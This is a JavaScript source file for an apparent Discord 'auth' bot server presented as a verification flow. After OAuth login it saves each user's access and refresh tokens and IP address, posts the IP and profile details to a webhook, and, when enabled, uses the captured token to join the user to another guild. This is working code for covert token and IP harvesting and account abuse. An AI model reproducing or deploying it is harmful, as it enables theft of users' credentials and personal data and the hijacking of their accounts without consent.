// @ts-check

/* Core API */
const { log, error, warn } = require("./Utils/logger");
const { client, authLink, authClient } = require("./Utils/client");
const config = require("./Settings/config");

client.login(config.token);

const express = require("express");
const app = express();

/* Core Database */
const botSchema = require("./Schema/botSchema");

/* Core Extra Modules */
const axios = require("axios");

require("./Utils/loader")(client);
process.setMaxListeners(0);

/* Core Auth Modules */

/* Core Auth Web Configuration */
app.listen(config.web.port, () => {
  log(`Auth Scanner is running on port ${config.web.port}`);
});

/* Core Auth Profile */
// passport.use(new DiscordStrategy({
//     clientID: config.client.id,
//     clientSecret: config.client.secret,
//     callbackURL: config.client.redirect_uri,
//     scope: config.client.scope,
// },
//     function (accessToken, refreshToken, profile, cb) {
//         let data = {
//             ...profile,
//             accessToken,
//             refreshToken
//         }
//         cb(null, data)
//     }));

/* Core Auth Website */
app.get("/", function (req, res) {
  res.redirect(authLink);
});

// app.get('/verified', function (req, res) {
//     res.sendFile(__dirname + '/Views/verified.html');
// })

app.get("/discord", function (req, res) {
  res.redirect(`${config.client.serverLink}`);
});

function safeToLowerCase(str) {
  if (str && typeof str === "string") {
    return str
      .split("")
      .map((char) => {
        const code = char.charCodeAt(0);
        if (code >= 65 && code <= 90) {
          return String.fromCharCode(code + 32);
        }
        return char;
      })
      .join("");
  }
  return str;
}

app.get("/auth", async (req, res) => {
  res.sendFile(__dirname + "/Views/index.html");
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const data = await authClient.manageAuth(req.query.code);
  const user_id = await authClient.requestId(data.access_token);
  if (!user_id) return log("Başarısız");
  const user_ = await authClient.fetchUser(user_id);
  const botData = await botSchema.findOne({ clientId: client.user?.id });

  // let aronshire_ = await axios
  //   .get(`https://api.ipregistry.co/${ip}?key=${config.web.apiKey}`)
  //   .then((res) => res.data)
  //   .catch();
  // let countryCode = aronshire_?.location?.country?.code || null;
  const countryCode = "tr";

  let locale = ":flag_white:"; // Default to white flag or another suitable default

  if (countryCode) {
    locale = `:flag_${safeToLowerCase(countryCode)}:`;
  }

  let userData = {
    id: user_?.id,
    username: user_?.username,
    discriminator: user_?.discriminator,
    avatar: `https://cdn.discordapp.com/avatars/${user_?.id}/${user_?.avatar}.png`,
    accessToken: data.access_token,
    refreshToken: data.refresh_token,
    expiresDate: Date.now() + 604800,
    locale: locale,
    ip: `${ip}`,
  };

  authClient.saveAuth(userData);
  authClient.sendWebhook({
    embeds: [
      {
        color: 3092790,
        title: `👤 New User`,
        thumbnail: { url: userData.avatar, dynamic: true },
        fields: [
          {
            name: "Account Creation On",
            value: `<t:${Math.round((user_?.createdTimestamp ?? 0) / 1000)}>`,
            inline: true,
          },
          {
            name: "Locale",
            value: locale,
            inline: true,
          },
          {
            name: "AutoJoin",
            value: `\`${
              botData?.autoJoin[0]?.status === true ? "Enabled" : "Disabled"
            }\``,
            inline: true,
          },
          {
            name: "AutoMessage",
            value: "``Disabled``",
            inline: true,
          },
          {
            name: "AutoRole",
            value: "``Enabled``",
            inline: true,
          },
          {
            name: "IP Address",
            value: `\`${ip}\``,
            inline: true,
          },
        ],
        footer: {
          text: `${config.client.footer} ・ ${config.client.serverLink}`,
        },
        description: `\`\` ${userData.username}#${userData.discriminator} \`\` \`\` ${userData.id} \`\``,
      },
    ],
  });

  if (botData?.autoJoin[0]?.status === true) {
    authClient.joinServer(
      userData.accessToken,
      botData.autoJoin[0].guildID,
      userData.id
    );
    authClient.sendWebhook({
      embeds: [
        {
          color: 3092790,
          title: `👤 Auth Joiner`,
          thumbnail: { url: userData.avatar },
          description: `\`\` ${userData.username}#${userData.discriminator} \`\` \`\` ${userData.id} \`\``,
          fields: [
            {
              name: "Server",
              value: `\`${botData.autoJoin[0].guildName}\``,
              inline: true,
            },
            {
              name: "Server ID",
              value: `\`${botData.autoJoin[0].guildID}\``,
              inline: true,
            },
          ],
          footer: {
            text: `${config.client.footer} ・ ${config.client.serverLink}`,
          },
        },
      ],
    });
  }

  const guild1 = client.guilds.cache.get(config.guild.id);
  guild1?.members
    .fetch(user_id)
    .then((member) => {
      member.roles
        .add(config.guild.role)
        .then(() => log(`Role added to ${member.user.username}`))
        .catch(error);
    })
    .catch((error) => {
      warn(`User ${user_id} is not a member of the guild ${guild1.name}`);
      error(error);
    });
});

process
  .on("uncaughtException", (e) => {
    error(`Uncaught exception: `, e);
  })
  .on("unhandledRejection", (e) => {
    error(`Unhandled rejection: `, e);
  });
